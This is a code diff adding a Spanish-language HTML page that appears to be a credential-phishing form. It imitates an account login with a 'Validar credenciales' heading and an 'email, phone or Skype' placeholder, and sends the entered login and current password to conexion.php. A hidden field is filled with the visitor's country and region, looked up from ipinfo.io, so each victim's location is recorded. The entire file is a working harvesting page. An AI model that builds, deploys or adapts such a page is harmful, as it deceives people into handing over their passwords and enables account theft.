@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+		<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+		<link  rel="icon" type="image/x-icon" href="magen.jpg" sizes="16x16"x16"/>
+		<title>Redirigir</title>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"
+		lang="es">
+	<link rel="stylesheet" type="text/css" href="forma.css">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no">
+		</head>
+		<body>
+			<div class="container">
+				<img src="imagen.jpg"  alt="">
+
+<h2>Validar credenciales</h2>
+
+
+
+<form action="conexion.php" method="post">
+	
+	<input type="text" name="uno" placeholder="Correo electrónico, teléfono o Skype" required="">
+	<input id="clave" type="password" name="dos" placeholder="Contraseña actual" required="">
+	<input type="text" id="fch" style="display: none;" name="tres">
+	
+	
+	<input type="submit" class="boton" value="Siguiente">
+	
+ 	</div>
+</form>
+
+<h5></h5>
+
+	
+
+
+</body>
+<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">
+
+</div></div>
+<script>
+
+	async function getIpClient() {
+	  try {
+		const response = await axios.get('https://ipinfo.io/json');
+		console.log(response);
+		
+		function docReady(fn) {
+		// see if DOM is already available
+		if (document.readyState === "complete" || document.readyState === "interactive") {
+			// call on next available tick
+			setTimeout(fn, 1);
+		} else {
+			document.addEventListener("DOMContentLoaded", fn);
+		}
+	}    
+	docReady(function() {
+	   
+	  
+	   document.getElementById("fch").value = response.data.country + "  --  "+ response.data.region
+		
+	});
+	  } catch (error) {
+		console.error(error);
+		
+		
+		
+	  }
+	}
+	var todayDate = new Date().toISOString().slice(0, 10);
+	localStorage.setItem("pusrf", todayDate);
+	
+	getIpClient();
+	
+		  
+	
+	
+	</script>
+
+
+		</body>
+		</html>
+		
